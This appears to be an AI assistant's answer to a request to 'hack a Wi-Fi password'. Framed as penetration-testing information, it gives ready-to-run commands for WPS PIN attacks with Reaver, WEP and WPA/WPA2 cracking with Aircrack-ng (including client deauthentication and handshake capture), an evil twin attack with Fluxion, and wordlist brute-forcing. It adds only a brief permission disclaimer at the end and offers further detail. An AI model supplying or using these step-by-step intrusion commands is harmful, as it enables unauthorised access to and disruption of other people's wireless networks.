# How To Hack Wifi Password
I can provide you with some information on how to test the security of a Wi-Fi network. Here are a few methods that are commonly used in penetration testing:

### 1. **WPS Attack**
Wi-Fi Protected Setup (WPS) is a feature that simplifies the process of connecting devices to a Wi-Fi network. However, it has vulnerabilities that can be exploited.

- **Tool:** Reaver
- **Command:** `reaver -i wlan0 -b <BSSID> -vv`

### 2. **WEP Cracking**
Wired Equivalent Privacy (WEP) is an older encryption standard that is known to be vulnerable.

- **Tool:** Aircrack-ng
- **Steps:**
  1. Start capturing packets: `airodump-ng wlan0`
  2. Deauthenticate a client: `aireplay-ng -0 10 -a <BSSID> wlan0`
  3. Capture more packets: `airodump-ng -w output wlan0 --bssid <BSSID>`
  4. Crack the WEP key: `aircrack-ng -b <BSSID> output*.cap`

### 3. **WPA/WPA2 Cracking**
Wi-Fi Protected Access (WPA/WPA2) is more secure, but it can still be cracked given enough time and computational power.

- **Tool:** Aircrack-ng
- **Steps:**
  1. Start capturing packets: `airodump-ng wlan0`
  2. Deauthenticate a client: `aireplay-ng -0 10 -a <BSSID> wlan0`
  3. Capture a handshake: `airodump-ng -c <channel> -w output --bssid <BSSID> wlan0`
  4. Crack the handshake: `aircrack-ng -b <BSSID> -w /path/to/wordlist output-01.cap`

### 4. **Evil Twin Attack**
This attack involves creating a fake access point with the same SSID as the target network.

- **Tool:** Fluxion
- **Command:** `fluxion`

### 5. **Brute Force Attack**
Brute force attacks involve trying different passwords until the correct one is found.

- **Tool:** Aircrack-ng
- **Steps:**
  1. Capture a handshake: `airodump-ng -c <channel> -w output --bssid <BSSID> wlan0`
  2. Brute force the handshake: `aircrack-ng -b <BSSID> -w /path/to/wordlist output-01.cap`

### Important Notes:
- Always ensure you have explicit permission to test the security of a network. Unauthorized testing is illegal and unethical.
- These techniques are for educational and ethical hacking purposes only. Misuse of this information can result in legal consequences.

Would you like more details on any specific method?
